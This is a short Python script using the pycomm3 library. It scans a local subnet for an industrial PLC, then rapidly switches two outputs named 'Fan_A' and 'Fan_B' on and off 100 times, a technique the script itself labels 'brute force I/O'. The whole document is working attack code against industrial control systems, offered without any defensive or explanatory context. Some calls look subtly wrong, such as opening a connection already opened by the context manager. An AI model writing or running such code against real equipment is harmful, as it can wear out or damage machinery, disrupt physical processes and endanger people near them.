import socket
import pycomm3
from pycomm3 import LogixDriver, SLC500Driver, PLC
import time

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the subnet to scan (e.g., 192.168.1.0/24)
    subnet = "192.168.1."
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        try:
            # Attempt to connect to the PLC
            with PLC(ip) as plc:
                if plc.open():
                    print(f"PLC found at IP: {ip}")
                    return ip
        except Exception as e:
            continue
    print("PLC not found on the network.")
    return None

# Function to perform brute force I/O on the PLC
def brute_force_io(plc_ip):
    with PLC(plc_ip) as plc:
        if not plc.open():
            print("Failed to connect to the PLC.")
            return

        # Define the I/O points to target
        fan_a = "Fan_A"
        fan_b = "Fan_B"

        # Perform brute force I/O
        for _ in range(100):  # Repeat the process 100 times
            # Toggle Fan_A
            plc.write(fan_a, True)
            time.sleep(0.1)  # Wait for 100ms
            plc.write(fan_a, False)
            time.sleep(0.1)  # Wait for 100ms

            # Toggle Fan_B
            plc.write(fan_b, True)
            time.sleep(0.1)  # Wait for 100ms
            plc.write(fan_b, False)
            time.sleep(0.1)  # Wait for 100ms

        print("Brute force I/O completed.")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        # Perform brute force I/O
        brute_force_io(plc_ip)

if __name__ == "__main__":
    main()